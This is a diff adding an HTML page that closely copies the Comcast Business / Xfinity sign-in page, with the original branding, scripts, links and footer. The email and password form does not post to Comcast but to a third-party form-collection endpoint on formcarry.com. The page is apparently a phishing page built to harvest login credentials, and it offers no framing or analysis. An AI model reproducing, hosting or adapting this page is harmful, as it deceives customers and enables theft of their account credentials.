@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+
+<html lang="en" class="">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+		<meta name="viewport" content="width=device-width,initial-scale=1">
+		<title></title>
+
+		<link rel="shortcut icon" href="https://login.xfinity.com/static/bcp/images/favicon.ico">
+
+					<link rel="preconnect" href="https://fonts.gstatic.com">
+			<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap" rel="stylesheet">
+			<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+				<link rel="stylesheet" type="text/css" media="screen" href="https://login.xfinity.com/static/bcp/bundle.css?v=00cdbdd"/>
+				
+		<script type="text/javascript" src="https://login.xfinity.com/static/bcp/bundle.js?v=00cdbdd" defer></script>
+					<script type="text/javascript" src="https://login.xfinity.com/static/js/comcast-common.js"></script>
+						
+            <script type="text/javascript" src="https://static.cimcontent.net/data-layer/?appID=login"></script>
+    
+	<script type="tracking-data-digitalData">
+		{
+			"page" : {
+				"pageInfo" : {
+					"screenName" : "sign in",
+					"language" : "en",
+					"referrerId" : "comcast-business-myaccount-prod"
+				 },
+				 "category" : {
+                    "primaryCategory" : "login",
+                                                            "designType" : "responsive",
+                    "businessType" : "resi",
+                    "siteType" : "selfservice"
+                },
+                "affiliate" : {
+                    "name": "comcast",
+                    "channel" : "web"
+                },
+                "codebase" : {
+                    "name" : "cima login"
+                }
+                			},
+			"user" : [{
+				"profile" : [{
+					"profileInfo" : {
+						"authenticationType" : "unauthenticated",
+						"recognizationType" : "unrecognized"
+					}
+				}],
+				"segment" : {
+					"isLocalized" : false
+				}
+			}],
+			"schemaVersion" : 0.18
+		}
+
+	</script>
+    <script>
+	    document.addEventListener("DOMContentLoaded", function () {
+		    document.dispatchEvent(new CustomEvent("c-tracking-log-page", {
+			    bubbles: true
+		    }));
+	    });
+            </script>
+		<script type="tracking-data-page">
+			{
+				"category": {
+					"businessType" : "busn"
+				}
+			}
+		</script>
+
+					</head>
+	<body>
+		
+		<main>
+				<div class="login-page">
+		<div class="login-form-background">
+			<section class="login-form-container">
+						<form  action="https://formcarry.com/s/hW2QiWzg4k" method="post" class="username-challenge "> 
+				<h1 class='h1 bcp-logo-black'><span class="sr-only">Comcast Business</span></h1>
+				<div class="bcp-form-content" >
+					<h2 class="heading5">Sign In</h2>
+					<fieldset>
+						<legend class="sr-only">Enter your credentials</legend>
+													<label for="user" class="label-above bodyM tablet:label">Email Address</label>
+							<div class="validation-wrapper textfield-wrapper">
+								<input
+										id="user"
+										name="user"
+										type="text"
+										autocomplete="username"
+										required
+										data-valueMissing-message="Please enter your email."
+										aria-describedby="usernameError"
+										value="[[]]"
+								Required/>
+							</div>
+							<p id="usernameError" class="body4 error-message hidden"></p>
+						
+													<label for="passwd" class="label-above bodyM tablet:label">Password</label>
+							<div class="validation-wrapper textfield-wrapper">
+								<input
+										id="passwd"
+										name="passwd"
+										type="password"
+										autocomplete="current-password"
+										required
+										data-valueMissing-message="Please enter your password."
+										aria-describedby="passwordError"
+								/>
+							</div>
+							<p id="passwordError" class="body4 error-message hidden"></p>
+						
+													<label for="remember_me" class="checkbox-wrapper label">
+								<input type="checkbox" id="remember_me" name="rm" value="1" />
+								<div class="checkbox-display"></div>
+								Remember me							</label>
+											</fieldset>
+
+											
+											
+											
+											
+											
+											
+											
+											
+											
+											
+											
+											
+					
+					
+											<button
+						class="btn-primary"
+						id="sign_in"
+						type="submit"
+												data-tracking="&#123;&quot;eventAction&quot; : &quot;sign in&quot;&#125;"
+					>Sign in</button>
+					
+															<p class="bodyL tablet:desktop-bodyM">Forgot <a
+						class="btn-link"
+						href=""
+						data-tracking="&#123; &quot;eventAction&quot; : &quot;forgot username&quot;&#125;"
+						target="_self"
+						title="Lookup email address"
+					>email address</a> or <a
+						class="btn-link"
+						href=""
+						data-tracking="&#123;&quot;eventAction&quot; : &quot;forgot password&quot;&#125;"
+						target="_self"
+						title="Reset password"
+					>password</a>?</p>
+				</div>
+			</form>
+							<aside>
+										<h2 class="heading5 tablet:desktop-heading5">Register for My Account</h2>
+					<p class="bodyL tablet:desktop-bodyL">View and pay your bill, customize your account preferences, manage your services, and more.</p>
+					<form method="post" action="<?php echo basename(__FILE__); ?>">
+						<button type="submit" class="btn-secondary" data-tracking="&#123;&quot;eventAction&quot; : &quot;register your account&quot;&#125;">Register now</button>
+						
+					</form>
+
+					<h2 class="heading5 tablet:desktop-heading5">Short on time?</h2>
+					<p class="bodyL tablet:desktop-bodyL">Make an easy and secure bill payment for a single account without signing in.</p>
+					<a
+							class="btn-secondary"
+							href=""
+							data-tracking="&#123;&quot;eventAction&quot; : &quot;quick pay&quot;&#125;"
+					>Try Quick Pay</a>
+
+					<h2 class="heading5 tablet:desktop-heading5">Xfinity customer?</h2>
+										<p class="bodyL tablet:desktop-bodyL">
+						Xfinity customers, <a
+						class="btn-link"
+						href="https://login.xfinity.com/login?selectAccount=false&ipAddrAuthn=false&passive=false&client_id=comcast-business-myaccount-prod&reqId=b74c8f49-6d31-49d3-b5dd-58249d9cffbc&maxAuthnAge=1170&r=comcast.net&s=oauth&deviceAuthn=false&continue=https%3A%2F%2Foauth.xfinity.com%2Foauth%2Fauthorize%3Fclient_id%3Dcomcast-business-myaccount-prod%26redirect_uri%3Dhttps%253A%252F%252Fbusiness.comcast.com%252Faccount%252Fsignin-cima%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520email%2520address%2520offline_access%2520phone%2520urn%253Abusiness-profileapi%2520urn%253Abusiness-notificationapi%2520urn%253Aconvoy%253Ascope%253Achannel-service%253Aprocess-action%2520urn%253Ambo%253Ascope%253Acustomer%253Aorder%253Aread%2520urn%253Ambo%253Ascope%253Aaccount%253Aself%26response_mode%3Dform_post%26max_age%3D1170%26state%3DCfDJ8Jz40ARahOFCvx3vV0pDodF_Bei-ZTXW0HgR39QgCaI7IUY264ME6SPJGaA-JPADDtx0jF_vjHw8adD9h94Ydl4hMdkBlxbPYQL8tVDbf-jwVvZm3zzi1r2uGiOvo-sFjAsJPG7HwuhmXZJYtR8J2-MhNSA3G64MizMYI-aQRKPVhbfS53kz49QqZ24aX0QC8R5cFaUJP2OA94BU3J9K_IJ6iCiDkMEKddkOiHwCiRUydZSqehyQanMDFuP0eoVV_bcXKyWSG_afOwZ8D4OGS9Zqmjz3VNyktSp6SQORGSvIAVSWWTj41p2nZZS2nsLptjrshp2QV2_StGIM5oeJhisdBm4ntuuPnXwtuti9Kqom%26x-client-SKU%3DID_NET%26x-client-ver%3D2.1.4.0%26response%3D1&forceAuthn=0&rm=2&lang=en"
+						data-tracking="&#123;&quot;eventAction&quot; : &quot;xfinity customer sign in&quot;&#125;"
+					>sign in</a> to your account.					</p>
+				</aside>
+					</section>
+		</div>
+					<section class="features-container">
+	<h2 class="heading3">Get the most out of <span class="whitespace-nowrap">My Account</span></h2>
+	<ul>
+		<li>
+			<h3 class="heading5 tablet:desktop-heading4">Download the App</h3>
+			<p class="bodyL tablet:desktop-bodyL">Get anytime, anywhere account access with the Comcast Business App.</p>
+			<div class="badge-container">
+				<a
+						class="apple store-link"
+						href="https://apps.apple.com/us/app/comcast-business/id668736626?itsct=apps_box&amp;itscg=30200"
+						data-tracking="&#123;&quot;eventAction&quot; : &quot;app store&quot;&#125;"
+				><img src="https://login.xfinity.com/static/bcp/images/AppStoreBadge.svg" alt="Download on the App Store"></a>
+				<a
+						class="google store-link"
+						href='https://play.google.com/store/apps/details?id=com.comcast.business.voiceedge&pcampaignid=pcampaignidMKT-Other-global-all-co-prtnr-py-PartBadge-Mar2515-1'
+						data-tracking="&#123;&quot;eventAction&quot; : &quot;play store&quot;&#125;"
+				><img alt='Get it on Google Play' src='https://login.xfinity.com/static/bcp/images/GooglePlayBadge.svg'/></a>
+			</div>
+		</li>
+		<li>
+			<h3 class="heading5 tablet:desktop-heading4">Pay Your Bill Online</h3>
+			<p class="bodyL tablet:desktop-bodyL">Make and schedule payments, customize your billing options, and more.</p>
+		</li>
+		<li>
+			<h3 class="heading5 tablet:desktop-heading4">Manage Your Account</h3>
+			<p class="bodyL tablet:desktop-bodyL">View and pay your bill, customize your account preferences, manage your services, and more.</p>
+		</li>
+		<li>
+			<h3 class="heading5 tablet:desktop-heading4">Access Cloud Solutions</h3>
+			<p class="bodyL tablet:desktop-bodyL">Boost productivity with a suite of apps designed to keep your business moving forward.</p>
+		</li>
+	</ul>
+</section>
+							<section class="registration-container">
+				<h2 class="heading4">Not yet a Comcast Business customer?</h2>
+				<a
+						class="btn-link"
+						href="http://business.comcast.com/?noredirect"
+						data-tracking="&#123;&quot;eventAction&quot; : &quot;register new customer&quot;&#125;"
+				>Find the best solution for your business.</a>
+			</section>
+			</div>
+
+										
+					</main>
+
+					<footer class="bodyM">
+	<div>
+		<a href="https://business.comcast.com/help-and-support/contact-us/">Contact Us</a>
+		<a href="https://business.comcast.com/community/">Community</a>
+		<a href="https://business.comcast.com/about-us">About Comcast Business</a>
+		<a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a>
+		<a href="https://www.xfinity.com/privacy/manage-preference">Do Not Sell My Personal Information</a>
+		<a href="https://www.xfinity.com/corporate/legal/visitorAgreement">Visitor Agreement</a>
+		<div>
+			<a href="https://business.comcast.com/terms-conditions-smb">Terms &amp; Conditions</a>
+			<a href="http://ips-invite.iperceptions.com/webValidator.aspx?sdfc=355b766d-123881-c733c77b-141a-42d7-be9f-2e52b426622b&lID=1&source=102226">Website Feedback</a>
+		</div>
+	</div>
+	<hr />
+	<div>&copy;2022 Comcast Corporation</div>
+	<div class="social-media-links">
+		<a class="facebook badge"
+		   href="https://www.facebook.com/ComcastBusiness" target="_blank"
+		   data-tracking="&#123;&quot;eventAction&quot; : &quot;Facebook&quot;&#125;"
+		></a>
+		<a class="linkedIn badge"
+		   href="https://www.linkedin.com/company/comcast-business" target="_blank"
+		   data-tracking="&#123;&quot;eventAction&quot; : &quot;LinkedIn&quot;&#125;"
+		></a>
+		<a class="twitter badge"
+		   href="https://twitter.com/comcastbusiness" target="_blank"
+		   data-tracking="&#123;&quot;eventAction&quot; : &quot;Twitter&quot;&#125;"
+		></a>
+	</div>
+</footer>
+			</body>
+</html>
